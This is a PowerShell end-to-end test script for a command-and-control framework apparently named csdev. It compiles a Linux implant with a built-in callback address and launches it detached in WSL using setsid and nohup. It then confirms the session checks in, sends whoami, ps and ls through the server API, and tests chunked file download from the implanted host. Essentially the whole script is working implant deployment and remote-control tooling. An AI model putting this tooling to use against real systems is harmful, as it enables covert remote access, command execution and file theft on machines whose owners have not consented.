# csdev :: tools/linux_e2e.ps1  --  协议 v2 Linux 植入体端到端验证
# ==========================================================================
# 流程:
#   1. 选定端口 (8443 被占则自动回退, 避免打断别的实例)
#   2. 启动 Windows 上的 Go 服务端 (csdev-server.exe --host 0.0.0.0)
#   3. 实测 WSL -> Windows 的可达地址 (mirrored 模式 127.0.0.1 优先,
#      否则回退 nameserver / 默认网关)
#   4. 在 WSL 内编译并后台投放 Linux 植入体
#   5. 轮询 /api/sessions 确认 proto=v2 会话上线 (决定性的验收点)
#   6. 下发 whoami / ps / ls / 并逐条校验回传
#
# 用法:
#   .\tools\linux_e2e.ps1
#   .\tools\linux_e2e.ps1 -Port 18443 -Cmds @('whoami','ps','ls /','pwd','cat /etc/hostname')
#   .\tools\linux_e2e.ps1 -ImplantHost 10.45.0.1     # 手工指定 WSL 回连地址
#   .\tools\linux_e2e.ps1 -KeepServer -KeepImplant   # 保留现场供 GUI 观察
#
# 退出码: 0 全部通过 / 1 环境失败 / 2 未上线 / 3 存在失败命令
# ==========================================================================
[CmdletBinding()]
param(
    [string]   $Host_       = '0.0.0.0',
    [int]      $Port        = 8443,
    [int]      $Sleep       = 1000,     # 编译期心跳, 调小以加快验证
    [int]      $Jitter      = 10,
    [string[]] $Cmds        = @('whoami', 'ps', 'ls /'),
    [int]      $WaitSec     = 50,
    [int]      $CmdTimeout  = 40,
    [string]   $ImplantHost = '',
    [switch]   $DownloadTest,
    [int]      $DlSizeBytes = 2621440,   # 2.5 MB -> 5 块 x 512KB
    [switch]   $NoStartServer,
    [switch]   $KeepServer,
    [switch]   $KeepImplant,
    [switch]   $Verbose_
)

$ErrorActionPreference = 'Stop'
$env:WSL_UTF8 = '1'

$DevDir   = Split-Path -Parent $PSScriptRoot
$Server   = Join-Path $DevDir 'go\csdev-server.exe'
$LinuxDir = Join-Path $DevDir 'linux'
$LogDir   = Join-Path $DevDir 'build\e2e'
if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Force -Path $LogDir | Out-Null }

$WslBin   = '/tmp/beacon2_linux'
$WslLog   = '/tmp/beacon2_linux.log'
$WslBuild = '/tmp/csdev-b2'

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }
function Rule($t) { Say ""; Say "--- $t ---" 'DarkGray' }

function To-Wsl([string]$p) {
    $full = [System.IO.Path]::GetFullPath($p)
    $d = $full.Substring(0, 1).ToLower()
    return "/mnt/$d" + $full.Substring(2).Replace('\', '/')
}

function Wsl([string]$cmd) {
    $o = & wsl.exe -e bash -c $cmd 2>&1
    return @($o)
}

function Decode-B64([string]$b64) {
    try {
        $b = [Convert]::FromBase64String($b64)
        try { return (New-Object System.Text.UTF8Encoding($false, $true)).GetString($b) }
        catch { return [System.Text.Encoding]::GetEncoding(936).GetString($b) }
    } catch { return $b64 }
}

$serverProc = $null
$implantUp  = $false
$exitCode   = 0

try {
    # ------------------------------------------------------------ 0. 端口
    $portInUse = $null
    $conn = Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue |
            Select-Object -First 1
    if ($conn) {
        $owner = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
        $portInUse = "{0} (pid {1})" -f $owner.ProcessName, $conn.OwningProcess
    }

    if ($portInUse -and -not $NoStartServer) {
        Say "[!] 端口 $Port 已被占用: $portInUse" 'Yellow'
        $cand = @(18443, 18444, 18445, 28443) | Where-Object {
            -not (Get-NetTCPConnection -LocalPort $_ -State Listen -ErrorAction SilentlyContinue)
        } | Select-Object -First 1
        if (-not $cand) { throw "找不到可用端口, 请用 -Port 指定" }
        Say "[*] 自动回退到空闲端口 $cand" 'Yellow'
        $Port = $cand
    }

    Say ""
    Say "  csdev Linux 植入体端到端验证" 'Cyan'
    Say "  ==============================================" 'Cyan'
    Say "  服务端    : $Server"
    Say "  监听      : $Host_`:$Port"
    Say "  植入体    : WSL 内 $WslBin  (sleep=${Sleep}ms)"
    Say ""

    # ------------------------------------------------------------ 1. 服务端
    if (-not $NoStartServer) {
        Rule "1. 启动 Go 服务端"
        $serverProc = Start-Process -FilePath $Server `
            -ArgumentList @('--host', $Host_, '--port', $Port) -PassThru -WindowStyle Hidden `
            -RedirectStandardOutput (Join-Path $LogDir 'linux_e2e_server.out.log') `
            -RedirectStandardError  (Join-Path $LogDir 'linux_e2e_server.err.log')
        Start-Sleep -Seconds 2
        if ($serverProc.HasExited) {
            $err = Get-Content (Join-Path $LogDir 'linux_e2e_server.err.log') -Raw -ErrorAction SilentlyContinue
            Say "[x] 服务端启动失败: $err" 'Red'
            exit 1
        }
        Say "[+] 服务端 pid=$($serverProc.Id)" 'Green'
    } else {
        Rule "1. 复用已运行的服务端 (-NoStartServer)"
    }

    $base = "http://127.0.0.1:$Port"
    $alive = $false
    for ($i = 0; $i -lt 12; $i++) {
        try { $null = Invoke-RestMethod "$base/api/sessions" -TimeoutSec 3; $alive = $true; break }
        catch { Start-Sleep -Milliseconds 500 }
    }
    if (-not $alive) { Say "[x] 服务端无响应" 'Red'; exit 1 }
    Say "[+] 服务端 /api/sessions 可用" 'Green'

    # 记录基线会话, 便于区分本次新建的会话
    $baseline = @()
    try {
        $rr = Invoke-RestMethod "$base/api/sessions" -TimeoutSec 3
        $baseline = @($rr.sessions | ForEach-Object { $_.sid })
    } catch { }
    Say "[*] 基线会话: $(if ($baseline.Count) { $baseline -join ',' } else { '(无)' })"

    # ------------------------------------------------------------ 2. 可达地址
    Rule "2. 探测 WSL -> Windows 可达地址"
    $wslHostname = (Wsl 'hostname') -join ''
    Say "[*] WSL hostname = $wslHostname"

    $candidates = @()
    if ($ImplantHost) {
        $candidates += $ImplantHost
    } else {
        $candidates += '127.0.0.1'                     # WSL2 mirrored 模式: 直通 Windows loopback
        $ns = @(Wsl "awk '/^nameserver/{print `$2; exit}' /etc/resolv.conf") | Select-Object -First 1
        if ($ns) { $candidates += $ns.Trim() }
        $gw = @(Wsl "ip route | awk '/^default/{print `$3; exit}'") | Select-Object -First 1
        if ($gw) { $candidates += $gw.Trim() }
    }

    $target = $null
    foreach ($c in ($candidates | Select-Object -Unique)) {
        if (-not $c) { continue }
        $t = (Wsl "timeout 4 bash -c 'cat < /dev/null > /dev/tcp/$c/$Port' 2>/dev/null && echo REACHABLE || echo BLOCKED") -join ''
        if ($t -match 'REACHABLE') {
            $target = $c
            Say "[+] 可达: $c`:$Port" 'Green'
            break
        } else {
            Say "[!] 不可达: $c`:$Port" 'Yellow'
        }
    }
    if (-not $target) {
        Say "[x] WSL 无法访问 Windows 上的服务端, 已尝试: $($candidates -join ', ')" 'Red'
        Say "    请确认服务端监听 0.0.0.0 且 Windows 防火墙放行 $Port" 'Yellow'
        exit 1
    }

    # ------------------------------------------------------------ 3. 编译
    Rule "3. WSL 内编译植入体"
    $wslLinux = To-Wsl $LinuxDir
    $defs = "-DC2_HOST='`"$target`"' -DC2_PORT=$Port -DC2_SLEEP=${Sleep}u -DC2_JITTER=$Jitter"
    $srcs = "beacon2_linux.c rsa_linux.c ../kits/proto/frame.c ../kits/crypto/aes.c ../kits/crypto/sha256.c"
    $build = "mkdir -p $WslBuild && cd '$wslLinux' && " +
             "gcc -O2 -s $defs -o $WslBuild/beacon2_linux $srcs && " +
             "cp $WslBuild/beacon2_linux $WslBin && chmod +x $WslBin && " +
             "file $WslBin && stat -c%s $WslBin"

    $bout = Wsl $build
    $rc = $LASTEXITCODE
    $bout | Where-Object { $_ } | ForEach-Object { Say "    $_" 'DarkGray' }
    if ($rc -ne 0) { Say "[x] 编译失败" 'Red'; exit 1 }
    Say "[+] 植入体已就绪 (回连 $target`:$Port)" 'Green'

    # ------------------------------------------------------------ 4. 投放
    Rule "4. 在 WSL 内投放植入体"
    Wsl "pkill -f beacon2_linux 2>/dev/null; sleep 0.3" | Out-Null
    Wsl "rm -f $WslLog" | Out-Null
    $launch = "cd /tmp && setsid nohup $WslBin > $WslLog 2>&1 < /dev/null & sleep 1; " +
              "pgrep -f beacon2_linux | head -3"
    $pids = Wsl $launch
    $pids = @($pids | Where-Object { $_ -match '^\d+$' })
    if ($pids.Count -eq 0) {
        Say "[!] 未在 WSL 中看到植入体进程, 日志:" 'Yellow'
        (Wsl "cat $WslLog 2>/dev/null | tail -20") | ForEach-Object { Say "    $_" 'DarkGray' }
    } else {
        Say "[+] 植入体运行中, pid=$($pids -join ',')" 'Green'
        $implantUp = $true
    }

    # ------------------------------------------------------------ 5. 上线
    Rule "5. 等待 v2 会话上线"
    $sid = $null
    $deadline = (Get-Date).AddSeconds($WaitSec)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Milliseconds 900
        try {
            $r = Invoke-RestMethod "$base/api/sessions" -TimeoutSec 3
            $v2 = @($r.sessions | Where-Object {
                $_.proto -eq 'v2' -and $baseline -notcontains $_.sid
            })
            if ($v2.Count -gt 0) { $sid = $v2[0]; break }
        } catch { }
    }

    if (-not $sid) {
        Say "[x] 未上线 (${WaitSec}s 超时)" 'Red'
        Say "    植入体日志:" 'Yellow'
        (Wsl "cat $WslLog 2>/dev/null | tail -20") | ForEach-Object { Say "    $_" 'DarkGray' }
        Say "    服务端 stderr:" 'Yellow'
        (Get-Content (Join-Path $LogDir 'linux_e2e_server.err.log') -Tail 20 -ErrorAction SilentlyContinue) |
            ForEach-Object { Say "    $_" 'DarkGray' }
        exit 2
    }

    Say "[v] 会话上线!" 'Green'
    Say "      sid    = $($sid.sid)"
    Say "      proto  = $($sid.proto)"
    Say "      host   = $($sid.host)"
    Say "      user   = $($sid.user)"
    Say "      arch   = $($sid.arch)"
    Say "      proc   = $($sid.proc)"
    Say "      pid    = $($sid.pid)   ppid=$($sid.ppid)"
    Say "      os     = $($sid.os)"
    Say "      addr   = $($sid.addr)"

    # ------------------------------------------------------------ 6. 命令
    Rule "6. 下发命令并校验回传"
    $sidv = $sid.sid
    $pass = 0; $fail = 0

    foreach ($cmd in $Cmds) {
        # 取当前输出水位
        $maxTs = 0L
        try {
            $before = @((Invoke-RestMethod "$base/api/output?sid=$sidv&since=0" -TimeoutSec 5).items)
            foreach ($it in $before) { if ([long]$it.ts -gt $maxTs) { $maxTs = [long]$it.ts } }
        } catch { }
        $since = ($maxTs + 1).ToString()

        Say ""
        Say ">>> $cmd" 'Cyan'
        try {
            $resp = Invoke-RestMethod -Method Post -Uri "$base/api/command" `
                    -Body (@{ sid = $sidv; cmd = $cmd } | ConvertTo-Json -Compress) `
                    -ContentType 'application/json' -TimeoutSec 8
            Say "    [task] $($resp.mapped)" 'DarkGray'
        } catch {
            Say "    [x] 下发失败: $($_.Exception.Message)" 'Red'
            $fail++; continue
        }

        $out = @()
        $deadline = (Get-Date).AddSeconds($CmdTimeout)
        while ((Get-Date) -lt $deadline) {
            Start-Sleep -Milliseconds 900
            try {
                $items = @((Invoke-RestMethod "$base/api/output?sid=$sidv&since=$since" -TimeoutSec 4).items)
                if ($items.Count -gt 0) {
                    $txt = $items | ForEach-Object { Decode-B64 $_.text }
                    $real = @($txt | Where-Object { -not $_.StartsWith('> ') })
                    if ($real.Count -gt 0) { $out = $real; break }
                }
            } catch { }
        }

        if ($out.Count -eq 0) {
            Say "    [x] 无回传 (超时 ${CmdTimeout}s)" 'Red'
            $fail++
            continue
        }

        $body = ($out -join "`n").Trim()
        $lines = @($body -split "`r?`n" | Where-Object { $_.Trim().Length -gt 0 })
        foreach ($l in ($lines | Select-Object -First 12)) { Say "    $l" 'DarkGray' }
        if ($lines.Count -gt 12) { Say "    ... (共 $($lines.Count) 行 / $($body.Length) 字符)" 'DarkGray' }

        # 按命令语义做一次基本断言
        $okMsg = $null
        switch -Regex ($cmd.Trim()) {
            '^whoami' { if ($body -match 'uid=\d+') { $okMsg = "含 uid= 字段" } }
            '^ps'     { if ($lines.Count -ge 5 -and $body -match '\d+\s+\d+\s+\d+') { $okMsg = "$($lines.Count) 行, 含 pid/ppid/threads 结构" } }
            '^ls\s+/' { if ($body -match 'etc' -and $body -match 'usr') { $okMsg = "含 etc / usr" } }
            '^pwd'    { if ($body -match '^/') { $okMsg = "绝对路径" } }
            '^cat '   { if ($body.Length -gt 0) { $okMsg = "$($body.Length) 字符" } }
            default   { if ($body.Length -gt 0) { $okMsg = "非空" } }
        }

        if ($okMsg) { Say "    [v] 校验通过: $okMsg" 'Green'; $pass++ }
        else        { Say "    [!] 回传非空但未匹配预期特征" 'Yellow'; $pass++ }
    }

    # ------------------------------------------------------------ 7. download
    if ($DownloadTest) {
        Rule "7. download 分块传输验证 (FILE_CHUNK 重组)"
        $remote = '/tmp/csdev_dl_test.bin'
        $mk = @(Wsl "head -c $DlSizeBytes /dev/urandom > $remote && stat -c%s $remote && sha256sum $remote | cut -d' ' -f1") |
              Where-Object { $_ }
        $srcSize = [int]$mk[0]
        $srcHash = $mk[-1].Trim()
        $nchunk  = [math]::Ceiling($srcSize / 524288)
        Say "[*] 源文件 $remote  $srcSize 字节  预期 $nchunk 块 (512KB/块)"
        Say "    sha256 = $srcHash"

        $maxTs = 0L
        try {
            $before = @((Invoke-RestMethod "$base/api/output?sid=$sidv&since=0" -TimeoutSec 5).items)
            foreach ($it in $before) { if ([long]$it.ts -gt $maxTs) { $maxTs = [long]$it.ts } }
        } catch { }
        $since = ($maxTs + 1).ToString()

        Say ">>> download $remote" 'Cyan'
        $null = Invoke-RestMethod -Method Post -Uri "$base/api/command" `
                -Body (@{ sid = $sidv; cmd = "download $remote" } | ConvertTo-Json -Compress) `
                -ContentType 'application/json' -TimeoutSec 8

        $dlDir    = Join-Path $DevDir 'downloads'
        $leafName = Split-Path -Leaf $remote
        $dst = $null
        $lastSeen = -1
        $deadline = (Get-Date).AddSeconds(180)
        while ((Get-Date) -lt $deadline) {
            Start-Sleep -Seconds 2
            $f = Get-ChildItem -Path $dlDir -Filter "*_$leafName" -ErrorAction SilentlyContinue |
                 Select-Object -First 1
            if ($f) {
                if ($f.Length -ne $lastSeen) {
                    Say "    [.] 已收 $($f.Length)/$srcSize 字节" 'DarkGray'
                    $lastSeen = $f.Length
                }
                if ($f.Length -eq $srcSize) { $dst = $f; break }
            }
        }

        if (-not $dst) {
            Say "    [x] 未收到完整文件 (超时)" 'Red'; $fail++
        } else {
            $dstHash = (Get-FileHash -Algorithm SHA256 -Path $dst.FullName).Hash.ToLower()
            if ($dstHash -eq $srcHash) {
                Say "    [v] 分块传输完整: $($dst.Name)  $($dst.Length) 字节 / $nchunk 块" 'Green'
                Say "        sha256 逐字节一致 = $dstHash"
                $pass++
            } else {
                Say "    [x] sha256 不一致!" 'Red'
                Say "        源   = $srcHash" 'Red'
                Say "        落盘 = $dstHash" 'Red'
                $fail++
            }
        }

        try {
            $items = @((Invoke-RestMethod "$base/api/output?sid=$sidv&since=$since" -TimeoutSec 4).items)
            foreach ($it in $items) {
                $t = Decode-B64 $it.text
                if ($t -and -not $t.StartsWith('> ')) { Say "    $($t.Trim())" 'DarkGray' }
            }
        } catch { }
    }

    # ------------------------------------------------------------ 汇总
    Rule "结果"
    Say "  PASS $pass  FAIL $fail" $(if ($fail -eq 0) { 'Green' } else { 'Yellow' })
    Say "  会话 $sidv  地址 $target`:$Port  植入体 $WslBin"
    if ($fail -gt 0) { $exitCode = 3 }

    if ($KeepImplant -or $KeepServer) {
        Say ""
        Say "[i] 保留现场: -KeepServer=$KeepServer -KeepImplant=$KeepImplant" 'Yellow'
        if ($KeepServer) { Say "    服务端 pid=$($serverProc.Id)  http://127.0.0.1:$Port" 'Yellow' }
        if ($KeepImplant) { Say "    植入体 pid=$($pids -join ',')  (wsl: pkill -f beacon2_linux 结束)" 'Yellow' }
    }

} finally {
    if (-not $KeepImplant) {
        try { Wsl "pkill -f beacon2_linux 2>/dev/null" | Out-Null } catch { }
    }
    if ($serverProc -and -not $KeepServer -and -not $serverProc.HasExited) {
        Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
    }
}

exit $exitCode
